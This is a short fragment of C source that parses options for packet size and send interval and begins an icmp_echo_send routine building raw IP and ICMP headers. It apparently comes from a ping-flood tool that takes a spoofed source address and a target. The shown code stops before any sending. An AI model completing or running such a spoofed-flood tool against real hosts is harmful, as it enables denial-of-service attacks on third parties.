```
case 's': pingsize = strtoul(optarg, &endptr, 10);
if (*endptr != '\0') {
printf("%s is a bad packet size '%s'\n", argv[0], optarg);
return -1;
}
break;
case 'i': pingsleep = strtoul(optarg, &endptr, 10);
if (*endptr != '\0') {
printf("%s is a bad wait time '%s'\n", argv[0], optarg);
return -1;
}
break;
case 'V': version(); break;
case '?':
case ':': return -1; break;
}
}

if (optind > argc-2) {
return -1;
}

if (!pingsize)
pingsize = 28;
else
pingsize = pingsize - 36 ;

if (!pingsleep)
pingsleep = 100;

spof_name = argv[optind++];
dest_name = argv[optind++];
return 0;
}

inline int icmp_echo_send(int socket,
unsigned long spoof_addr,
unsigned long t_addr,
unsigned pingsize)
{
unsigned char packet[5122];
struct iphdr *ip;
struct icmphdr *icmp;
struct iphdr *origip;
unsigned char *data;

int i;
ip = (struct iphdr *)packet;

icmp = (struct icmphdr *) (packet+IPHDRSIZE);
origip = (struct iphdr *) (packet+IPHDRSIZE+ICMPHDRSIZE);
```